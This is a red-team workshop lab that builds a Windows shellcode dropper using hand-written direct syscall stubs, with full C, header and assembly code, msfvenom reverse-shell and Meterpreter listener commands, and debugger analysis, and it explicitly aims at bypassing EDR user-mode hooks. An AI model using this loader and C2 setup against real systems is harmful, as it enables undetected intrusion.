## LAB Exercise 4: Direct Syscall Dropper
Related to the Win32 dropper, in this exercise we will make the second modification, create the direct syscall dropper and implement the required syscalls or syscall stubs from each of the four native functions directly into the assembly (dropper). We will call this the direct syscall dropper.
<details>
     <p align="center">
<img width="900" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/7b2c52a9-7ca1-4c7d-a169-96f61f137b49">
</p>
</details>

## Exercise 4 Tasks: 
### Build Direct Syscall Dropper
| Task Nr.  | Task Description |
| :---:     | ---              |
| 1         | Download the direct syscall dropper poc from the code section of this chapter.                 |
| 2         | Most of the code is already implemented in the poc. However, you have to complete the direct syscall dropper by performing the following tasks: <ul><li>Create a new header file ``syscalls.h`` and use the supplied code for syscalls.h, which follows in this playbook. Also include syscalls.h in the main code as header syscalls.h</li><li>Import the ``syscalls.asm`` file as a resource and complete the assembly code by adding the missing assembler code for the remaining three native APIs following the scheme of the already implemented code for NtAllocateVirtualMemory.</li><li>Enable Microsoft Macro Assembler (MASM) in the direct syscall poc in Visual Studio.</li></ul> |
| 3         | Create a staged x64 meterpreter shellcode with msfvenom, copy it to the poc and compile the poc.                 |
| 4         | Create and run a staged x64 meterpreter listener using msfconsole.                 |
| 5         | Run your compiled .exe and check that a stable command and control channel opens.                  |

### Analyse Direct Syscall Dropper
| Task Nr.  | Task Description |
| :---:     | ---              |
| 6         | Use the Visual Studio **dumpbin** tool to analyse the syscall dropper. Are any Win32 APIs being imported from kernel32.dll? Is the result what you expected?                   |
| 7         | Use **x64dbg** to debug or analyse the dropper. <ul><li>Check which Win32 APIs and native APIs are being imported. If they are being imported, from which module or memory location are they being imported? Is the result what you expected?</li><li>Check from which module or memory location the syscalls for the four APIs used are being executed. Is the result what you expected?</li></ul>                 |

## Visual Studio
You can download the poc from the code section of this chapter. The code works as follows, shellcode declaration is done as before.
<details>
    
```C
// Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83";
```
    
</details>


The main code of the direct syscall dropper looks like the following and is already implemented in the poc. Again, we use the same native APIs to allocate memory, write memory, create a new thread and wait for exit.
<details>
<summary>Code</summary>
    
```C
#include <iostream>
#include <Windows.h>
#include "syscalls.h"

int main() {
    // Insert Meterpreter shellcode
    unsigned char code[] = "\xfc\x48\x83...";

    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = NULL;
    SIZE_T size = sizeof(code);
    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region
    SIZE_T bytesWritten;
    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Execute the shellcode in memory using a new thread
    // Pass the address of the shellcode as the thread function (StartRoutine) and its parameter (Argument)
    HANDLE hThread;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);

    // Wait for the end of the thread to ensure the shellcode execution is complete
    NtWaitForSingleObject(hThread, FALSE, NULL);


    // Return 0 as the main function exit code
    return 0;
}
```
    
</details>

    
### Header File
Unlike the native dropper, we **no longer ask ntdll.dll** for the function definition of the native APIs we use. But we still want to use the native functions, so we need to define or **directly implement** the structure for all four native functions in a header file. In this case, the header file should be called **syscalls.h**. The syscalls.h file does not currently exist in the syscall poc folder, your task is to add a new header file named syscalls.h and implement the required code. The code for the syscalls.h file can be found in the code section below. You will also need to include the header ``syscalls.h`` in the main code. 
     
Additional information if you want to check the function definition manually should be available in the Microsoft documentation, e.g. for [NtAllocateVirtualMemory](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory). 

<details>
<summary>Code</summary>

```C
#ifndef _SYSCALLS_H  // If _SYSCALLS_H is not defined then define it and the contents below. This is to prevent double inclusion.
#define _SYSCALLS_H  // Define _SYSCALLS_H

#include <windows.h>  // Include the Windows API header

#ifdef __cplusplus   // If this header file is included in a C++ file, then this section will be true
extern "C" {         // This is to ensure that the names of the functions are not mangled by the C++ compiler and are in C linkage format
#endif

    // The type NTSTATUS is typically defined in the Windows headers as a long.
    typedef long NTSTATUS;  // Define NTSTATUS as a long
    typedef NTSTATUS* PNTSTATUS;  // Define a pointer to NTSTATUS

    // Declare the function prototype for NtAllocateVirtualMemory
    extern NTSTATUS NtAllocateVirtualMemory(
        HANDLE ProcessHandle,    // Handle to the process in which to allocate the memory
        PVOID* BaseAddress,      // Pointer to the base address
        ULONG_PTR ZeroBits,      // Number of high-order address bits that must be zero in the base address of the section view
        PSIZE_T RegionSize,      // Pointer to the size of the region
        ULONG AllocationType,    // Type of allocation
        ULONG Protect            // Memory protection for the region of pages
    );

    // Declare the function prototype for NtWriteVirtualMemory
    extern NTSTATUS NtWriteVirtualMemory(
        HANDLE ProcessHandle,     // Handle to the process in which to write the memory
        PVOID BaseAddress,        // Pointer to the base address
        PVOID Buffer,             // Buffer containing data to be written
        SIZE_T NumberOfBytesToWrite, // Number of bytes to be written
        PULONG NumberOfBytesWritten // Pointer to the variable that receives the number of bytes written
    );

    // Declare the function prototype for NtCreateThreadEx
    extern NTSTATUS NtCreateThreadEx(
        PHANDLE ThreadHandle,        // Pointer to a variable that receives a handle to the new thread
        ACCESS_MASK DesiredAccess,   // Desired access to the thread
        PVOID ObjectAttributes,      // Pointer to an OBJECT_ATTRIBUTES structure that specifies the object's attributes
        HANDLE ProcessHandle,        // Handle to the process in which the thread is to be created
        PVOID lpStartAddress,        // Pointer to the application-defined function of type LPTHREAD_START_ROUTINE to be executed by the thread
        PVOID lpParameter,           // Pointer to a variable to be passed to the thread
        ULONG Flags,                 // Flags that control the creation of the thread
        SIZE_T StackZeroBits,        // A pointer to a variable that specifies the number of high-order address bits that must be zero in the stack pointer
        SIZE_T SizeOfStackCommit,    // The size of the stack that must be committed at thread creation
        SIZE_T SizeOfStackReserve,   // The size of the stack that must be reserved at thread creation
        PVOID lpBytesBuffer          // Pointer to a variable that receives any output data from the system
    );

    // Declare the function prototype for NtWaitForSingleObject
    extern NTSTATUS NtWaitForSingleObject(
        HANDLE Handle,          // Handle to the object to be waited on
        BOOLEAN Alertable,      // If set to TRUE, the function returns when the system queues an I/O completion routine or APC for the thread
        PLARGE_INTEGER Timeout  // Pointer to a LARGE_INTEGER that specifies the absolute```c
        // or relative time at which the function should return, regardless of the state of the object
    );

#ifdef __cplusplus  // End of the 'extern "C"' block if __cplusplus was defined
}
#endif

#endif // _SYSCALLS_H  // End of the _SYSCALLS_H definition
  
```
    
</details>
    
<details>
<summary>Solution</summary>   
    <p align="center">
<img width="500" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/5fbb39c6-be30-4641-8652-6b98e478e17f"> 
    </p>
    <p align="center">   
    <img width="800" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/d116e34d-8bea-4d4b-a437-a27594218a5b">
    </p>
    <p align="center">
    <img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/4b3e7f58-b6c1-492a-9516-46dcf3af942c">
    </p>
</details>     
    

### Assembly Instructions
Furthermore, we do not want to ask ntdll.dll for the syscall stub or the content or code of the syscall stub (assembly instructions ``mov r10, rcx``, ``mov eax, SSN`` etc.) of the native functions we use, instead we have to implement the necessary assembly code in the assembly itself. As mentioned above, instead of using a tool to create the necessary assembly instructions, for the best learning experience we will **manually implement** the **assembly code** in our direct syscall poc. To do this, you will find a file called ``syscalls.asm`` in the direct syscall dropper poc directory, which contains some of the required assembler code. The code below shows the assembler code for the syscall stub of ``NtAllocateVirtualMemory`` which is already implemented in the syscalls.asm file. 

<details>
<summary>Code</summary>

```asm
.CODE  ; Start the code section
; Procedure for the NtAllocateVirtualMemory syscall
NtAllocateVirtualMemory PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, 18h                                    ; Move the syscall number into the eax register.
    syscall                                         ; Execute syscall.
    ret                                             ; Return from the procedure.
NtAllocateVirtualMemory ENDP     
END  ; End of the module    
```
    
</details>
     
It is your task to **add** the ``syscalls.asm`` file **as a resource** (existing item) to the direct syscall dropper project and **complete** the **assembler code** or add the **syscall stub** for the other three missing native APIs ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``.

If you are unable to complete the assembly code at this time, you can use the assembly code from the solution and paste it into the ``syscalls.asm`` file in the **direct syscall dropper poc**. **Note** that the syscalls IDs are for **Windows 10 Enterprise 22H2** and may not work for your target. You may need to replace the syscalls IDs with the correct syscalls IDs for your target Windows version.
    
<details>
    <summary>Solution</summary>

```asm
.CODE  ; Start the code section
; Procedure for the NtAllocateVirtualMemory syscall
NtAllocateVirtualMemory PROC
    mov r10, rcx                                    ; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.
    mov eax, 18h                                    ; Move the syscall number into the eax register.
    syscall                                         ; Execute syscall.
    ret                                             ; Return from the procedure.
NtAllocateVirtualMemory ENDP                     	; End of the procedure.

; Similar procedures for NtWriteVirtualMemory syscalls
NtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, 3AH
    syscall
    ret
NtWriteVirtualMemory ENDP

; Similar procedures for NtCreateThreadEx syscalls
NtCreateThreadEx PROC
    mov r10, rcx
    mov eax, 0C2h
    syscall
    ret
NtCreateThreadEx ENDP

; Similar procedures for NtWaitForSingleObject syscalls
NtWaitForSingleObject PROC
    mov r10, rcx
    mov eax, 4
    syscall
    ret
NtWaitForSingleObject ENDP

END  ; End of the module
```
    
</details>

    
    
### Microsoft Macro Assembler (MASM)
We have already implemented all the necessary assembler code in the syscalls.asm file. But in order for the code to be interpreted correctly within the direct syscall poc, we need to do a few things. These steps are not done in the downloadable poc and must be done manually. First, we need to **enable support** for **Microsoft Macro Assembler (MASM)** in the Visual Studio project by enabling the option in Build Dependencies/Build Customisations.
<details>
<summary>Solution</summary> 
<p align="center">
<img width="1278" alt="image" src="https://user-images.githubusercontent.com/50073731/235457590-371f3519-b7cf-483d-9c1c-6bfd6368be42.png">
<img width="590" alt="image" src="https://user-images.githubusercontent.com/50073731/235457782-780d2136-30d7-4e87-a022-687ed2557b33.png">
</details>

We also need to set the **item type** of the **syscalls.asm** file to Microsoft Macro Assembler, otherwise we will get an unresolved symbol error in the context of the native APIs used in the direct syscall dropper. We also set Excluded from Build to no and Content to yes. 
<details>
<summary>Solution</summary> 
    <p align="center">
<img width="950" alt="image" src="https://user-images.githubusercontent.com/50073731/235471947-4bcd23fc-5093-4f4d-adc8-eb3ef36f139f.png">    
<img width="1237" alt="image" src="https://user-images.githubusercontent.com/50073731/235458968-e330799e-51ff-46bf-97ab-c7d3be7ea079.png">
<img width="778" alt="image" src="https://user-images.githubusercontent.com/50073731/235459219-4387dc48-56f8-481c-b978-1b786843a836.png">
    </p>
</details>     

    

## Meterpreter Shellcode
Again, we will create our meterpreter shellcode with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
<details>
    
 **kali>**   
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
```
<p align="center">
<img width="800" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
</p>

The shellcode can then be copied into the direct syscall dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.
     
<p align="center">
<img width="600" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
</p>
</details>    


## MSF-Listener
Before we test the functionality of our direct syscall dropper, we need to create a listener within msfconsole.
<details>
    
**kali>**
```
msfconsole
```
**msf>**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost IPv4_Redirector_or_IPv4_Kali
set lport 80 
set exitonsession false
run
```
<p align="center">
<img width="600" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
</p>
</details>
 
    
Once the listener has been successfully started, you can run your compiled direct syscall dropper. If all goes well, you should see an incoming command and control session. 
<details>
    
<p align="center">
<img width="800" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
</p>
</details>
        

    
## Dropper Analysis: Dumpbin 
The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via ``kernel32.dll``. The following command can be used to check the imports. Which results do you expect?
<details>    
    
**cmd>**
```
cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
dumpbin /imports Path/to/Direct_Syscall_Dropper.exe
```
</details>    

<details>
    <summary>Results</summary>  
    
**No imports** from the Windows APIs ``VirtualAlloc``, ``WriteProcessMemory``, ``CreateThread`` and ``WaitForSingleObject`` from kernel32.dll. This was expected and is correct.
     
<p align="center">
<img width="1023" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/63f2bb5d-5090-491c-8c68-f177381b2136">
</p>
</details>   
    
    
## Dropper Analysis: x64dbg 
The first step is to run your direct syscall dropper, check that the .exe is running and that a stable meterpreter C2 channel is open. 
Then we open x64dbg and attach to the running process, note that if you open the direct syscall dropper directly in x64dbg, you need to run the assembly first.
     
<details>
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/a8509e63-ddea-4dee-894f-b2266bb3e504">
</p>
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/9b995e48-6bab-4af5-8589-d12b3ce7a3f9">
</p>    
</details>
     
    
First we want to check which APIs (Win32 or Native) are being imported and from which module or memory location. Remember that in the direct syscall dropper we no longer use Win32 APIs in the code and have implemented the structure for the native functions directly in the assembly. What results do you expect?
<details>
    <summary>Results</summary>
     
Checking the imported symbols in our direct syscall dropper, we should again see that the Win32 APIs ``VirtualAlloc``, ``WriteProcessMemory``, ``CreateThread`` and ``WaitForSingleObject`` are no longer imported by ``kernel32.dll``, or are no longer imported in general. So the result is the same as with dumpbin and seems to be valid. 
     
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/df8bde2d-f471-4176-b74f-a9d9a6ed6828">
</p>    
     
Also, looking at the imported symbols (symbols register), we see that instead of asking ntdll.dll for the code of the four required native functions ``NtAllocateVirutalMemory``, ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``, these native functions are implemented directly in the .text region of the dropper itself. 
     
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/e32b1bdd-c171-4810-ab00-db897cb9c2a6">
</p>  
     
We can also use the "Follow in Disassembler" function to analyse the direct syscall dropper to identify the lines of code where the calls to the native functions are made. 
     
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/6de307d9-c9b4-4120-bb53-a6619c5033fb">
</p>  
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/b7b95a63-e0d5-4afc-93d1-b3e027360536">
</p>          
</details>

We also want to check in which module the syscall stub or the assembler instructions of the native functions are implemented, or more precisely, from which module or memory location the ``syscall`` and ``return`` statements are executed. This will be important later when we compare direct and indirect syscalls. 
     
<details>
    <summary>Results</summary>
     
 For example, in the context of the native function ``NtAllocateVirtualMemory``, we use the Follow in Disassembler function and should be able to see that the syscall stub is not retrieved from ntdll.dll, instead the stub is implemented directly into the .text section of the assembly. We can also see that the ``syscall`` statement and the ``return`` statement are executed from the memory location of the direct syscall dropper assembly.   
     
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/c5eb2972-6760-4059-9e75-824d20e528fe">
</p> 
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/33471abd-4ccb-4246-98a8-a448d868cda9">
</p> 
<p align="center">
<img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/0ce40a86-3cf8-4587-a740-12781585ea8f">
</p>
</details>


## Summary:
- Made transition from Native APIs to direct syscalls
- Dropper imports no longer Windows APIs from kernel32.dll
- Dropper imports no longer Native APIs from ntdll.dll
- Syscalls or syscall stubs are implemented into .text section of the dropper itself
- User mode hooks in ntdll.dll and EDR can be bypassed 
